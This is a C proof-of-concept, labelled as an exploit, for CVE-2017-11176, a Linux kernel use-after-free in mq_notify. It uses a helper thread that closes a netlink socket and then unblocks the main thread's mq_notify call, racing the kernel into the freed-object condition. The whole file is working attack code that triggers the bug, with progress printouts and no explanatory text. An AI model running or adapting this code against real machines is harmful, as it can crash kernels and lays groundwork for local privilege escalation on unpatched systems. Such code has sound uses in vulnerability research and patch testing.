// gcc -o test test.c -O0 -pthread
#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>

#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(sockfd, level, optname, optval, optlen) syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)
#define _dup(oldfd) syscall(__NR_dup, oldfd)
#define _close(fd) syscall(__NR_close, fd)

#define NOTIFY_COOKIE_LEN 32 
#define SOL_NETLINK (270)

struct unblock_thread_arg
{
    int sock_fd;
    int unblock_fd;
    bool is_ready;
};

static void* unblock_thread(void *arg)
{
    struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
    int val = 3535; 

    printf("[Unblock] creating success, sleeping 5sec\n");
    uta->is_ready = true;
    sleep(5);

    printf("[Unblock] closing %d fd\n", uta->sock_fd);
    _close(uta->sock_fd);

    printf("[Unblock] unblocking now\n");
    if(_setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("[ERR][unblock thread] setsockopt");

    return NULL;
}

int main(void)
{
    struct sigevent sigev;
    char sival_buffer[NOTIFY_COOKIE_LEN];
    int sock_fd, unblock_fd;
    
    pthread_t tid;
    struct unblock_thread_arg uta;


	printf("\n-={ CVE-2017-11176 Exploit }=-\n\n");

    if((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) < 0)
	{
        perror("socket");
        goto fail;
    }
	printf("[Main] netlink socket created = %d\n", sock_fd);

    if((unblock_fd = _dup(sock_fd)) < 0)
    {
        perror("dup");
        goto fail;
    }
    printf("[Main] netlink socket fd duplicated = %d\n", unblock_fd);

    memset(&sigev, 0, sizeof(sigev));
    sigev.sigev_signo = sock_fd;
    sigev.sigev_notify = SIGEV_THREAD;
    sigev.sigev_value.sival_ptr = sival_buffer;

    memset(&uta, 0, sizeof(uta));
    uta.sock_fd = sock_fd;
    uta.unblock_fd = unblock_fd;
    uta.is_ready = false;

    printf("[Main] creating unblock thread...\n");
    if((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
    {
        perror("pthread_create");
        goto fail;
    }
    while(uta.is_ready == false)
        ;

    printf("[Main] get ready to block, mq_notify start!!\n");
	if(_mq_notify((mqd_t)-1, &sigev))
	{
		perror("mq_notify");
		goto fail;
	}
	printf("[Main] mq_notify succeed\n");


    return 0;

fail:
	printf("\n-={ Exploit Failed }=-\n");
    return -1;
}